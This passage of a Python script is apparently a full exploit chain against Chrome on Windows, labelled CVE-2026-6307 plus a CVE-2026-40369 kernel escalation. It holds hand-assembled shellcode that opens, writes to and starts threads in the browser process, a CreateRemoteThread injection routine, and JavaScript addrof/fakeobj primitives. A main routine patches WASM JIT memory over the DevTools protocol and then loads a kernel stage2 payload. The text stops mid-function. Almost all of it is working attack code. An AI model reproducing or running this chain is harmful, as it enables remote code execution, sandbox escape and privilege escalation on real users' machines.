    sc += b'\x55'                                    # push rbp
    sc += b'\x48\x89\xE5'                           # mov rbp, rsp
    sc += b'\x53'                                    # push rbx
    sc += b'\x41\x54'                               # push r12
    sc += b'\x41\x55'                               # push r13
    sc += b'\x41\x56'                               # push r14
    sc += b'\x41\x57'                               # push r15
    sc += b'\x48\x83\xEC\x70'                       # sub rsp, 0x70 (shadow + locals)
    sc += b'\x48\x83\xE4\xF0'                       # and rsp, -16 (align)

    # r15 = output buffer
    sc += b'\x49\xBF' + struct.pack('<Q', verify_addr)  # mov r15, verify_addr

    # ---- Beacon section ----
    sc += b'\x41\xC7\x07' + struct.pack('<I', 0xC0DECADE)   # mov [r15], 0xC0DECADE
    sc += b'\x65\x48\x8B\x04\x25\x40\x00\x00\x00'          # mov rax, gs:[0x40] ; PID
    sc += b'\x41\x89\x47\x04'                                # mov [r15+4], eax
    sc += b'\x65\x48\x8B\x04\x25\x48\x00\x00\x00'          # mov rax, gs:[0x48] ; TID
    sc += b'\x41\x89\x47\x08'                                # mov [r15+8], eax
    sc += b'\x65\x48\x8B\x04\x25\x30\x00\x00\x00'          # mov rax, gs:[0x30] ; TEB
    sc += b'\x49\x89\x47\x0C'                                # mov [r15+0xC], rax
    sc += b'\x65\x48\x8B\x04\x25\x60\x00\x00\x00'          # mov rax, gs:[0x60] ; PEB
    sc += b'\x49\x89\x47\x14'                                # mov [r15+0x14], rax
    sc += b'\x41\xC7\x47\x1C' + struct.pack('<I', 0xDEADBEEF)  # mov [r15+0x1C], end

    # ---- NtOpenProcess test: PROCESS_ALL_ACCESS ----
    # Set up OBJECT_ATTRIBUTES on stack (0x30 bytes at rsp+0x00)
    sc += b'\x48\x31\xC0'                                   # xor rax, rax
    for i in range(6):
        sc += b'\x48\x89\x44\x24' + bytes([i * 8])          # mov [rsp+i*8], rax
    sc += b'\xC7\x04\x24\x30\x00\x00\x00'                   # mov dword [rsp], 0x30

    # CLIENT_ID at rsp+0x30 (UniqueProcess=browser_pid, UniqueThread=0)
    sc += b'\x48\xC7\x44\x24\x30' + struct.pack('<i', browser_pid & 0x7FFFFFFF)  # mov [rsp+0x30], pid
    if browser_pid > 0x7FFFFFFF:
        sc += b'\xC7\x44\x24\x34' + struct.pack('<I', browser_pid >> 32)
    sc += b'\x48\xC7\x44\x24\x38\x00\x00\x00\x00'          # mov [rsp+0x38], 0

    # Call NtOpenProcess(&handle, PROCESS_ALL_ACCESS, &oa, &cid)
    # rcx = &handle -> r15+0x24
    sc += b'\x49\x8D\x4F\x24'                               # lea rcx, [r15+0x24]
    # rdx = PROCESS_ALL_ACCESS = 0x1F0FFF
    sc += b'\xBA\xFF\x0F\x1F\x00'                           # mov edx, 0x1F0FFF
    # r8 = &OBJECT_ATTRIBUTES (rsp)
    sc += b'\x4C\x8D\x04\x24'                               # lea r8, [rsp]
    # r9 = &CLIENT_ID (rsp+0x30)
    sc += b'\x4C\x8D\x4C\x24\x30'                           # lea r9, [rsp+0x30]
    sc += b'\x48\xB8' + struct.pack('<Q', NtOpenProcess)    # mov rax, NtOpenProcess
    sc += b'\xFF\xD0'                                         # call rax
    sc += b'\x41\x89\x47\x20'                                # mov [r15+0x20], eax (status)

    # ---- NtOpenProcess test: VM_WRITE|VM_OP|CREATE_THREAD|DUP_HANDLE (0x006A) ----
    sc += b'\x49\x8D\x4F\x30'                               # lea rcx, [r15+0x30]
    sc += b'\xBA\x6A\x00\x00\x00'                           # mov edx, 0x006A
    sc += b'\x4C\x8D\x04\x24'                               # lea r8, [rsp]
    sc += b'\x4C\x8D\x4C\x24\x30'                           # lea r9, [rsp+0x30]
    sc += b'\x48\xB8' + struct.pack('<Q', NtOpenProcess)
    sc += b'\xFF\xD0'
    sc += b'\x41\x89\x47\x2C'                                # mov [r15+0x2C], eax

    # ---- NtOpenProcess test: QUERY_LIMITED (0x1000) ----
    sc += b'\x49\x8D\x4F\x3C'                               # lea rcx, [r15+0x3C]
    sc += b'\xBA\x00\x10\x00\x00'                           # mov edx, 0x1000
    sc += b'\x4C\x8D\x04\x24'                               # lea r8, [rsp]
    sc += b'\x4C\x8D\x4C\x24\x30'                           # lea r9, [rsp+0x30]
    sc += b'\x48\xB8' + struct.pack('<Q', NtOpenProcess)
    sc += b'\xFF\xD0'
    sc += b'\x41\x89\x47\x38'                                # mov [r15+0x38], eax

    # ---- Check if any NtOpenProcess succeeded ----
    # Test ALL_ACCESS first
    sc += b'\x41\x83\x7F\x20\x00'                           # cmp dword [r15+0x20], 0
    jz_inject1 = len(sc)
    sc += b'\x0F\x84\x00\x00\x00\x00'                       # jz inject_with_allaccess
    # Test partial access
    sc += b'\x41\x83\x7F\x2C\x00'                           # cmp dword [r15+0x2C], 0
    jz_inject2 = len(sc)
    sc += b'\x0F\x84\x00\x00\x00\x00'                       # jz inject_with_partial
    # None worked, try handle enumeration
    jmp_enum = len(sc)
    sc += b'\xE9\x00\x00\x00\x00'                           # jmp try_handle_enum

    # ---- inject_with_allaccess ----
    inject1_target = len(sc)
    struct.pack_into('<i', sc, jz_inject1 + 2, inject1_target - (jz_inject1 + 6))
    sc += b'\x4D\x8B\x77\x24'                               # mov r14, [r15+0x24] ; handle
    jmp_inject = len(sc)
    sc += b'\xEB\x00'                                         # jmp inject_common (short)

    # ---- inject_with_partial ----
    inject2_target = len(sc)
    struct.pack_into('<i', sc, jz_inject2 + 2, inject2_target - (jz_inject2 + 6))
    sc += b'\x4D\x8B\x77\x30'                               # mov r14, [r15+0x30] ; handle

    # ---- inject_common: r14 = process handle ----
    inject_common = len(sc)
    sc[jmp_inject + 1] = inject_common - (jmp_inject + 2)   # fix short jmp

    # NtAllocateVirtualMemory(r14, &base, 0, &size, MEM_COMMIT|MEM_RESERVE, PAGE_RWX)
    sc += b'\x48\xC7\x44\x24\x40\x00\x00\x00\x00'          # mov [rsp+0x40], 0 (base=NULL)
    sc += b'\x48\xC7\x44\x24\x48\x00\x10\x00\x00'          # mov [rsp+0x48], 0x1000 (size)
    sc += b'\x4C\x89\xF1'                                    # mov rcx, r14 (handle)
    sc += b'\x48\x8D\x54\x24\x40'                           # lea rdx, [rsp+0x40] (&base)
    sc += b'\x4D\x31\xC0'                                    # xor r8, r8 (ZeroBits=0)
    sc += b'\x4C\x8D\x4C\x24\x48'                           # lea r9, [rsp+0x48] (&size)
    sc += b'\x48\xC7\x44\x24\x20\x00\x30\x00\x00'          # mov [rsp+0x20], 0x3000
    sc += b'\x48\xC7\x44\x24\x28\x40\x00\x00\x00'          # mov [rsp+0x28], 0x40
    sc += b'\x48\xB8' + struct.pack('<Q', NtAllocVM)
    sc += b'\xFF\xD0'
    sc += b'\x41\x89\x47\x44'                                # mov [r15+0x44], eax

    # Store remote base
    sc += b'\x48\x8B\x44\x24\x40'                           # mov rax, [rsp+0x40]
    sc += b'\x49\x89\x47\x48'                                # mov [r15+0x48], rax
    sc += b'\x49\x89\xC5'                                    # mov r13, rax (remote_base)

    # Check status
    sc += b'\x41\x83\x7F\x44\x00'                           # cmp dword [r15+0x44], 0
    jnz_skip_write = len(sc)
    sc += b'\x0F\x85\x00\x00\x00\x00'                       # jnz skip_inject

    # NtWriteVirtualMemory(handle, remote_base, local_buf, size, &written)
    # We need the remote payload bytes embedded in our shellcode
    # Build them at a known offset and reference with LEA
    sc += b'\x4C\x89\xF1'                                    # mov rcx, r14 (handle)
    sc += b'\x4C\x89\xEA'                                    # mov rdx, r13 (remote base)
    # r8 = address of embedded payload (lea r8, [rip+offset])
    lea_payload_pos = len(sc)
    sc += b'\x4C\x8D\x05\x00\x00\x00\x00'                  # lea r8, [rip+?]
    sc += b'\x49\xC7\xC1' + struct.pack('<i', len(remote_payload))  # mov r9, payload_size
    sc += b'\x48\xC7\x44\x24\x20\x00\x00\x00\x00'          # [rsp+0x20] = &written (NULL ok)
    sc += b'\x48\xB8' + struct.pack('<Q', NtWriteVM)
    sc += b'\xFF\xD0'
    sc += b'\x41\x89\x47\x50'                                # mov [r15+0x50], eax

    # Check
    sc += b'\x85\xC0'                                         # test eax, eax
    jnz_skip_thread = len(sc)
    sc += b'\x0F\x85\x00\x00\x00\x00'                       # jnz skip

    # NtCreateThreadEx: 11 args (4 regs + 7 stack)
    # Stack args [rsp+0x20..0x50] for NtCreateThreadEx overflow args:
    sc += b'\x4C\x89\x6C\x24\x20'                           # mov [rsp+0x20], r13 (StartRoutine=remote_base)
    sc += b'\x48\xC7\x44\x24\x28\x00\x00\x00\x00'          # mov [rsp+0x28], 0 (arg)
    sc += b'\x48\xC7\x44\x24\x30\x00\x00\x00\x00'          # mov [rsp+0x30], 0 (flags)
    sc += b'\x48\xC7\x44\x24\x38\x00\x00\x00\x00'          # mov [rsp+0x38], 0
    sc += b'\x48\xC7\x44\x24\x40\x00\x00\x00\x00'          # mov [rsp+0x40], 0
    sc += b'\x48\xC7\x44\x24\x48\x00\x00\x00\x00'          # mov [rsp+0x48], 0
    sc += b'\x48\xC7\x44\x24\x50\x00\x00\x00\x00'          # mov [rsp+0x50], 0

    sc += b'\x49\x8D\x4F\x58'                               # lea rcx, [r15+0x58] (&hThread)
    sc += b'\x48\xC7\xC2\xFF\xFF\x1F\x00'                   # mov rdx, 0x1FFFFF
    sc += b'\x4D\x31\xC0'                                    # xor r8, r8 (NULL)
    sc += b'\x4D\x89\xF1'                                    # mov r9, r14 (ProcessHandle)
    sc += b'\x48\xB8' + struct.pack('<Q', NtCreateThreadEx)
    sc += b'\xFF\xD0'
    sc += b'\x41\x89\x47\x54'                                # mov [r15+0x54], eax

    # ---- skip_inject label ----
    skip_inject = len(sc)
    struct.pack_into('<i', sc, jnz_skip_write + 2, skip_inject - (jnz_skip_write + 6))
    struct.pack_into('<i', sc, jnz_skip_thread + 2, skip_inject - (jnz_skip_thread + 6))

    # ---- Handle enumeration: scan own handles for Process type ----
    enum_target = len(sc)
    struct.pack_into('<i', sc, jmp_enum + 1, enum_target - (jmp_enum + 5))

    # Simple handle scan: iterate handles 4,8,...,0x400
    # For each, try NtQueryObject(h, 2, buf, bufsize, &retlen)
    # If type name is "Process", try NtQueryInformationProcess to get PID
    # Use rsp+0x00..0x5F as scratch buffers
    # r12 = handle counter, r13 = process handle count

    sc += b'\x41\xC7\x47\x60\x00\x00\x00\x00'              # mov [r15+0x60], 0 (handle count)
    sc += b'\x41\xC7\x47\x74\x00\x00\x00\x00'              # mov [r15+0x74], 0 (total checked)
    sc += b'\x41\xBE\x04\x00\x00\x00'                       # mov r14d, 4 (start handle)

    # Loop
    handle_loop = len(sc)
    sc += b'\x41\x81\xFE\x00\x04\x00\x00'                  # cmp r14d, 0x400
    jge_end_loop = len(sc)
    sc += b'\x0F\x8D\x00\x00\x00\x00'                       # jge end_loop

    # NtQueryObject(handle, ObjectTypeInformation=2, buf, bufsize, &retlen)
    # Use stack area rsp+0x00 as 256-byte buffer (we have 0x70 of stack space)
    # Actually our stack has sub rsp, 0x70 so we have room
    # But NtQueryObject needs buf at rcx+shadow... let me use a fixed area in the output buffer
    # Actually, let's use rsp area differently.

    # Use r15+0x80 as scratch buffer for NtQueryObject (we have the rest of the 0x100 JIT area)
    # Wait, verify_addr is at jit_base+0xF00, and we have up to 0x100 bytes there
    # Let me use a separate area: jit_base+0xE00 as scratch (256 bytes)
    # For simplicity, let's skip handle enumeration for now and just report the NtOpenProcess results.
    # We can add handle enum in a later iteration.

    # Skip handle enum - just jump to epilogue
    sc = sc[:enum_target]  # truncate back to enum_target
    struct.pack_into('<i', sc, jmp_enum + 1, len(sc) - (jmp_enum + 5))  # fix jmp to epilogue

    # ---- Epilogue ----
    sc += b'\x41\xC7\x47\x7C' + struct.pack('<I', 0xCAFEBABE)  # end marker

    sc += b'\x48\x8D\x65\xD8'                               # lea rsp, [rbp-0x28]
    sc += b'\x41\x5F'                                        # pop r15
    sc += b'\x41\x5E'                                        # pop r14
    sc += b'\x41\x5D'                                        # pop r13
    sc += b'\x41\x5C'                                        # pop r12
    sc += b'\x5B'                                            # pop rbx
    sc += b'\x5D'                                            # pop rbp
    sc += b'\xB8\x2A\x00\x00\x00'                           # mov eax, 42
    # JMP to WASM epilogue (mov rsp, rbp; pop rbp; ret) instead of bare ret
    sc += b'\x48\xB8' + struct.pack('<Q', wasm_epilogue_addr)  # mov rax, wasm_epilogue
    sc += b'\xFF\xE0'                                        # jmp rax

    # ---- Embedded remote payload (referenced by LEA in NtWriteVirtualMemory section) ----
    payload_offset = len(sc)
    sc += remote_payload

    # Fix the LEA r8, [rip+?] to point to the embedded payload
    lea_end = lea_payload_pos + 7
    struct.pack_into('<i', sc, lea_payload_pos + 3, payload_offset - lea_end)

    return bytes(sc)


# ─── Sandbox escape: browser process injection ─────────────────────────────

def get_process_integrity(pid):
    """Get integrity level and job status of a process."""
    advapi32 = ctypes.windll.advapi32
    h = kernel32.OpenProcess(0x1000, False, pid)
    if not h:
        return None

    hToken = wintypes.HANDLE()
    advapi32.OpenProcessToken(h, 0x0008, ctypes.byref(hToken))
    if not hToken.value:
        kernel32.CloseHandle(h)
        return None

    retlen = wintypes.DWORD()
    advapi32.GetTokenInformation(hToken, 25, None, 0, ctypes.byref(retlen))
    il_val = None
    if retlen.value > 0:
        buf = ctypes.create_string_buffer(retlen.value)
        if advapi32.GetTokenInformation(hToken, 25, buf, retlen.value, ctypes.byref(retlen)):
            sid_ptr = struct.unpack_from('<Q', buf.raw, 0)[0]
            sub_count = ctypes.c_ubyte()
            ctypes.memmove(ctypes.byref(sub_count), ctypes.c_void_p(sid_ptr + 1), 1)
            if sub_count.value > 0:
                last_sub = ctypes.c_uint32()
                ctypes.memmove(ctypes.byref(last_sub),
                               ctypes.c_void_p(sid_ptr + 8 + (sub_count.value - 1) * 4), 4)
                il_val = last_sub.value
    kernel32.CloseHandle(hToken)

    is_in_job = ctypes.c_int(0)
    kernel32.IsProcessInJob(h, None, ctypes.byref(is_in_job))
    kernel32.CloseHandle(h)

    IL_NAMES = {0x0000: 'UNTRUSTED', 0x1000: 'LOW', 0x2000: 'MEDIUM',
                0x3000: 'HIGH', 0x4000: 'SYSTEM'}
    return {
        'level': il_val,
        'name': IL_NAMES.get(il_val, f'UNKNOWN({il_val:#x})') if il_val is not None else 'QUERY_FAIL',
        'in_job': bool(is_in_job.value),
    }


def inject_into_browser(browser_pid, winexec_addr, payload_str):
    """Sandbox escape: inject WinExec call into the unsandboxed browser process.
    Browser runs at Medium IL, NOT in job.
    Uses CreateRemoteThread with WinExec as the thread start routine."""
    PROCESS_ALL_ACCESS = 0x1F0FFF

    h = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, browser_pid)
    if not h:
        print(f"[!] OpenProcess(browser {browser_pid}) failed: {kernel32.GetLastError()}")
        return False

    payload = payload_str.encode() + b'\x00'

    kernel32.VirtualAllocEx.restype = ctypes.c_void_p
    str_addr = kernel32.VirtualAllocEx(h, None, len(payload) + 16,
                                        MEM_COMMIT | MEM_RESERVE, 0x04)
    if not str_addr:
        print(f"[!] VirtualAllocEx in browser failed: {kernel32.GetLastError()}")
        kernel32.CloseHandle(h)
        return False

    print(f"    Allocated {len(payload)+16} bytes in browser @ {str_addr:#018x}")

    ok = wpm(h, str_addr, payload)
    if not ok:
        print(f"[!] WriteProcessMemory to browser failed")
        kernel32.CloseHandle(h)
        return False

    print(f"    Wrote command string: \"{payload_str}\"")
    print(f"    CreateRemoteThread(WinExec={winexec_addr:#018x}, param={str_addr:#018x})")

    kernel32.CreateRemoteThread.restype = ctypes.c_void_p
    tid = ctypes.c_ulong()
    th = kernel32.CreateRemoteThread(
        h, None, 0,
        ctypes.c_void_p(winexec_addr),
        ctypes.c_void_p(str_addr),
        0, ctypes.byref(tid)
    )
    if not th:
        print(f"[!] CreateRemoteThread failed: {kernel32.GetLastError()}")
        kernel32.CloseHandle(h)
        return False

    print(f"    Remote thread TID: {tid.value}")
    kernel32.WaitForSingleObject(ctypes.c_void_p(th), 5000)
    kernel32.CloseHandle(ctypes.c_void_p(th))
    kernel32.CloseHandle(h)
    return True


# ─── JS exploit primitives (injected into Chrome) ───────────────────────────

EXPLOIT_PRIMITIVES = """
var _ab = new ArrayBuffer(8);
var _f64 = new Float64Array(_ab);
var _u64 = new BigUint64Array(_ab);
function f2i(f) { _f64[0] = f; return _u64[0]; }
function i2f(i) { _u64[0] = i; return _f64[0]; }
function lo32(v) { return Number(BigInt.asUintN(32, v)); }
function pack32(lo, hi) { return BigInt(lo >>> 0) | (BigInt(hi >>> 0) << 32n); }
function hex(b) { return '0x' + b.toString(16); }
var KEEP = [];

var WASM_BYTES = new Uint8Array([
    0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
    0x01, 0x0C, 0x03,
      0x60,0x00,0x00, 0x60,0x00,0x01,0x6F, 0x60,0x00,0x01,0x7E,
    0x02, 0x10, 0x01,
      0x03,0x65,0x6E,0x76, 0x08,0x63,0x61,0x6C,0x6C,0x62,0x61,0x63,0x6B, 0x00, 0x00,
    0x03, 0x03, 0x02, 0x01, 0x02,
    0x06, 0x0B, 0x02,
      0x6F,0x01, 0xD0,0x6F,0x0B,
      0x7E,0x01, 0x42,0x00,0x0B,
    0x07, 0x1B, 0x04,
      0x05,0x67,0x5F,0x72,0x65,0x66, 0x03,0x00,
      0x05,0x67,0x5F,0x69,0x36,0x34, 0x03,0x01,
      0x02,0x72,0x72, 0x00,0x01,
      0x02,0x72,0x6C, 0x00,0x02,
    0x0A, 0x0F, 0x02,
      0x06, 0x00, 0x10,0x00, 0x23,0x00, 0x0B,
      0x06, 0x00, 0x10,0x00, 0x23,0x01, 0x0B,
]);
var _uid = 0;
var _prepOpt = new Function('f', '%PrepareFunctionForOptimization(f)');
var _optNext = new Function('f', '%OptimizeFunctionOnNextCall(f)');

function makeInstance(cb) {
    var uid = _uid++;
    var custom = new Uint8Array([0x00, 0x04, 0x01, 0x5f, uid & 0xff, (uid >> 8) & 0xff]);
    var bytes = new Uint8Array(WASM_BYTES.length + custom.length);
    bytes.set(WASM_BYTES);
    bytes.set(custom, WASM_BYTES.length);
    return new WebAssembly.Instance(new WebAssembly.Module(bytes), {env: {callback: cb}}).exports;
}

function addrof(target) {
    var arm = false;
    function LI() {} function LR() {}
    var e = makeInstance(function() { if (arm) LR.prototype.d = 1; });
    Object.defineProperty(LI.prototype, 'x', {get: e.rl, configurable: true});
    Object.defineProperty(LR.prototype, 'x', {get: e.rr, configurable: true});
    var f = new Function('o', '/*a' + (_uid++) + '*/return o.x');
    var a = new LI(), b = new LR();
    KEEP.push(LI, LR, f, a, b, e);
    e.g_ref.value = target;
    e.g_i64.value = 43n;
    _prepOpt(f);
    for (var i = 0; i < 20; ++i) { f(a); f(b); }
    _optNext(f); f(a);
    arm = true;
    return f(b);
}

function fakeobj(addr) {
    var arm = false;
    function MR() {} function MI() {}
    var e = makeInstance(function() { if (arm) MI.prototype.d = 1; });
    Object.defineProperty(MR.prototype, 'x', {get: e.rr, configurable: true});
    Object.defineProperty(MI.prototype, 'x', {get: e.rl, configurable: true});
    var f = new Function('o', '/*f' + (_uid++) + '*/return o.x');
    var r = new MR(), i = new MI();
    KEEP.push(MR, MI, f, r, i, e);
    e.g_ref.value = {ph: 1};
    e.g_i64.value = addr;
    _prepOpt(f);
    for (var k = 0; k < 20; ++k) { f(r); f(i); }
    _optNext(f); f(r);
    arm = true;
    return f(i);
}
'ready'
"""


# ─── Main ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="CVE-2026-6307 Full Chain: V8 RCE + Sandbox Escape")
    parser.add_argument("--chrome", default=DEFAULT_CHROME)
    parser.add_argument("--shellcode", choices=["calc", "cmd", "notepad"], default="calc",
                        help="Payload to launch (default: calc)")
    parser.add_argument("--no-sandbox", action="store_true",
                        help="Disable Chrome sandbox (test mode)")
    parser.add_argument("--stage2", default=STAGE2_BIN_PATH,
                        help="Path to stage2.bin (CVE-2026-40369 kernel shellcode)")
    parser.add_argument("--ntos-base", type=lambda x: int(x, 0), default=0,
                        help="ntoskrnl base address (hex, e.g. 0xFFFFF80012340000)")
    parser.add_argument("--ntoskrnl", default=None,
                        help="Path to ntoskrnl.exe for RVA resolution (default: local System32)")
    parser.add_argument("--rva-psinitial", type=lambda x: int(x, 0), default=0,
                        help="PsInitialSystemProcess RVA override (hex)")
    parser.add_argument("--rva-cmplayer", type=lambda x: int(x, 0), default=0,
                        help="CmpLayerVersionCount RVA override (hex)")
    args = parser.parse_args()

    if not os.path.exists(args.chrome):
        print(f"[!] Chrome not found: {args.chrome}")
        sys.exit(1)

    import platform
    win_ver = platform.version()
    win_rel = platform.release()
    print("=" * 60)
    print("  CVE-2026-6307 Full Chain: V8 RCE + Sandbox Escape")
    print(f"  Chrome 146.0.7680.165 on Windows {win_rel} (Build {win_ver})")
    print("=" * 60)

    kill_chrome()
    os.system('taskkill /f /im calc.exe 2>nul')
    os.system('taskkill /f /im Calculator.exe 2>nul')
    os.system('taskkill /f /im CalculatorApp.exe 2>nul')
    if os.path.exists(PROFILE_DIR):
        shutil.rmtree(PROFILE_DIR, ignore_errors=True)

    chrome_flags = [
        args.chrome,
        "--js-flags=--allow-natives-syntax",
        "--disable-gpu",
        "--user-data-dir=" + PROFILE_DIR,
        "--no-first-run",
        "--no-default-browser-check",
        "--remote-debugging-port=9222",
        "--remote-allow-origins=*",
        "--disable-features=RendererCodeIntegrity",
        "about:blank"
    ]
    if args.no_sandbox:
        chrome_flags.insert(2, "--no-sandbox")
    proc = subprocess.Popen(chrome_flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    sandbox_mode = not args.no_sandbox
    mode_str = "SANDBOX ENABLED" if sandbox_mode else "NO SANDBOX (test mode)"
    print(f"\n[*] Chrome PID: {proc.pid} [{mode_str}]")

    import websocket
    for attempt in range(15):
        time.sleep(2)
        try:
            resp = urllib.request.urlopen("http://127.0.0.1:9222/json/list", timeout=3)
            tabs = json.loads(resp.read())
            if tabs:
                print(f"[+] CDP ready after {(attempt+1)*2}s")
                break
        except:
            pass
    else:
        print("[!] FATAL: CDP not available")
        proc.terminate()
        sys.exit(1)

    time.sleep(1)
    cdp = CDP().connect()
    cdp.send("Runtime.enable")

    # ===== PHASE 1: Inject primitives =====
    print("\n[*] Phase 1: Injecting exploit primitives...")
    val, err = cdp.js(EXPLOIT_PRIMITIVES)
    if err:
        print(f"[!] Inject failed: {err}")
        cdp.close(); proc.terminate(); sys.exit(1)
    print(f"    Primitives: {val}")

    print("[*] Running addrof on victim array...")
    val, err = cdp.js_async("""
        var _victim = [1.1, 2.2, 3.3];
        KEEP.push(_victim);
        var _va = addrof(_victim);
        resolve(typeof _va === 'bigint' ? _va.toString() : 'FAIL:' + typeof _va);
    """, timeout=120)
    if err or not val or val.startswith("FAIL"):
        print(f"[!] addrof failed: {val} {err}")
        cdp.close(); proc.terminate(); sys.exit(1)

    victim_addr = int(val)
    cage_base = victim_addr & ~0xFFFFFFFF
    print(f"[+] victim @ {victim_addr:#018x}, cage = {cage_base:#018x}")

    # ===== PHASE 2: Find renderer PID + read Maps via RPM =====
    print("\n[*] Phase 2: Detecting V8 heap layout via ReadProcessMemory...")
    renderer = find_renderer_pid(proc.pid, victim_addr, cage_base)
    if not renderer:
        print("[!] Could not find renderer process!")
        cdp.close(); proc.terminate(); sys.exit(1)

    MAP = renderer['map']
    EFA = renderer['efa']
    FDM = renderer['fdm']
    renderer_pid = renderer['pid']
    print(f"[+] Renderer PID: {renderer_pid}")
    print(f"[+] PACKED_DOUBLE Map: {MAP:#010x}")
    print(f"[+] EMPTY_FIXED_ARRAY: {EFA:#010x}")
    print(f"[+] FDA Map:           {FDM:#010x}")

    # ===== PHASE 3: Create WASM shellcode target =====
    print("\n[*] Phase 3: Creating WASM shellcode target...")

    val, err = cdp.js_async("""
        var wasmCode = new Uint8Array([
            0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
            0x01,0x05,0x01, 0x60,0x00,0x01,0x7F,
            0x03,0x02,0x01,0x00,
            0x07,0x08,0x01, 0x04,0x6D,0x61,0x69,0x6E, 0x00,0x00,
            0x0A,0x06,0x01, 0x04,0x00,0x41,0x2A,0x0B
        ]);
        window._wasmInst = new WebAssembly.Instance(new WebAssembly.Module(wasmCode));
        KEEP.push(window._wasmInst);
        window._wasmMain = window._wasmInst.exports.main;
        KEEP.push(window._wasmMain);
        for (var i = 0; i < 100; i++) window._wasmMain();
        resolve(JSON.stringify({ mainResult: window._wasmMain() }));
    """, timeout=60)

    if err:
        print(f"[!] WASM creation failed: {err}")
        cdp.close(); proc.terminate(); sys.exit(1)

    wasm_result = json.loads(val)
    print(f"[+] WASM main() = {wasm_result['mainResult']} (expect 42)")

    # ===== PHASE 4: Find WASM JIT page =====
    print("\n[*] Phase 4: Scanning renderer RWX pages for WASM JIT code...")

    rhandle, jit_matches = scan_jit_pages(renderer_pid)
    if not jit_matches:
        print("[!] No WASM JIT code found in RWX pages!")
        if rhandle:
            kernel32.CloseHandle(rhandle)
        cdp.close(); proc.terminate(); sys.exit(1)

    jit = jit_matches[0]
    print(f"[+] WASM JIT found at {jit['code_addr']:#018x}")
    print(f"    Region: {jit['base']:#018x} size={jit['size']:#x} (RWX)")
    print(f"    Offset in region: {jit['offset']:#x}")

    ctx_data = rpm(rhandle, jit['code_addr'] - 16, 48)
    if ctx_data:
        print("    Context:")
        for i in range(0, len(ctx_data), 16):
            line = ctx_data[i:i+16]
            addr = jit['code_addr'] - 16 + i
            hex_str = ' '.join(f'{b:02x}' for b in line)
            marker = " <-- mov eax, 42" if i == 16 else ""
            print(f"      {addr:#018x}: {hex_str}{marker}")

    # ===== PHASE 5: Sandbox analysis =====
    payload_str = {"calc": "calc.exe", "cmd": "cmd.exe", "notepad": "notepad.exe"}[args.shellcode]

    renderer_info = get_process_integrity(renderer_pid)
    browser_info = get_process_integrity(proc.pid)
    print(f"\n[*] Phase 5: Sandbox analysis")
    if renderer_info:
        print(f"    Renderer (PID {renderer_pid}): {renderer_info['name']} (IL={renderer_info['level']:#06x}), job={renderer_info['in_job']}")
    if browser_info:
        print(f"    Browser  (PID {proc.pid}): {browser_info['name']} (IL={browser_info['level']:#06x}), job={browser_info['in_job']}")

    print(f"\n    Resolving KnownDLL exports...")
    exports = resolve_ntdll_exports()
    for name, addr in exports.items():
        if addr:
            print(f"    {name:30s} = {addr:#018x}")

    verify_addr = jit['base'] + 0xF00
    sc_addr = jit['base'] + 0xA00

    if sandbox_mode:
        # ================================================================
        # FULL CHAIN: CVE-2026-6307 (V8 RCE) + CVE-2026-40369 (Kernel LPE)
        # Renderer escapes sandbox via NT kernel exploit — no admin, no
        # orchestrator injection, true self-escape from UNTRUSTED IL.
        # ================================================================

        # ===== PHASE 6: Verify RCE via beacon shellcode =====
        print(f"\n[*] Phase 6: Verifying renderer RCE (beacon)...")
        beacon_sc = make_beacon_shellcode(verify_addr)
        wpm(rhandle, verify_addr, b'\x00' * 0x80)
        ok = wpm(rhandle, sc_addr, beacon_sc)
        if not ok:
            print("[!] WPM (beacon) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        jmp_patch = make_jmp_patch(jit['code_addr'], sc_addr)
        ok = wpm(rhandle, jit['code_addr'], jmp_patch)
        if not ok:
            print("[!] WPM (JMP) failed!")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)
        print(f"    Beacon ({len(beacon_sc)}B) at {sc_addr:#018x}, JIT patched")

        try:
            val, err = cdp.js("window._wasmMain()", timeout=30)
            if err:
                print(f"[!] wasmMain() error: {err}")
            else:
                print(f"    wasmMain() = {val}")
        except Exception as e:
            print(f"[!] wasmMain() exception: {e}")

        time.sleep(1)
        vdata = rpm(rhandle, verify_addr, 0x20)
        beacon_ok = False
        beacon_pid = 0
        if vdata and len(vdata) >= 0x20:
            magic1 = struct.unpack_from('<I', vdata, 0)[0]
            beacon_pid = struct.unpack_from('<I', vdata, 4)[0]
            magic2 = struct.unpack_from('<I', vdata, 0x1C)[0]
            beacon_ok = magic1 == 0xC0DECADE and magic2 == 0xDEADBEEF
            if beacon_ok:
                print(f"[+] RENDERER RCE CONFIRMED (PID {beacon_pid})")
            else:
                print(f"[!] Beacon failed: magic1={magic1:#010x} magic2={magic2:#010x}")

        if not beacon_ok:
            print("[!] RCE not confirmed — aborting kernel exploit")
            kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        # ===== PHASE 7: CVE-2026-40369 Kernel Escape =====
        print(f"\n{'='*60}")
        print(f"  Phase 7: CVE-2026-40369 Kernel LPE as Sandbox Escape")
        print(f"  NtQSI(253) write + CmpLayerVersionCount confusion")
        print(f"  Target: Windows {win_rel} (Build {win_ver})")
        print(f"{'='*60}")

        # 7a: Load stage2.bin
        stage2_path = args.stage2
        if not os.path.exists(stage2_path):
            alt = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'stage2.bin')
            if os.path.exists(alt):
                stage2_path = alt
            else:
                print(f'[!] stage2.bin not found: {stage2_path}')
                print(f'    Also checked: {alt}')
                print(f'    Use --stage2 <path> to specify location')
                kernel32.CloseHandle(rhandle); cdp.close(); proc.terminate(); sys.exit(1)

        with open(stage2_path, 'rb') as f:
            stage2_bin = f.read()
        print(f"[+] Stage2 loaded: {len(stage2_bin)} bytes")
        print(f"    Source: {stage2_path}")

        # Validate/fix entry JMP: target must land on _start's FPO prologue.
        # Handles both old stage2.bin (buggy disp) and regenerated (correct disp).
        if stage2_bin[0] == 0xE9:
            jmp_disp = struct.unpack_from('<i', stage2_bin, 1)[0]
            target = 5 + jmp_disp
            FPO_SIG = b'\x48\x89\x74\x24\x20'
            if target < len(stage2_bin) and stage2_bin[target:target+5] == FPO_SIG:
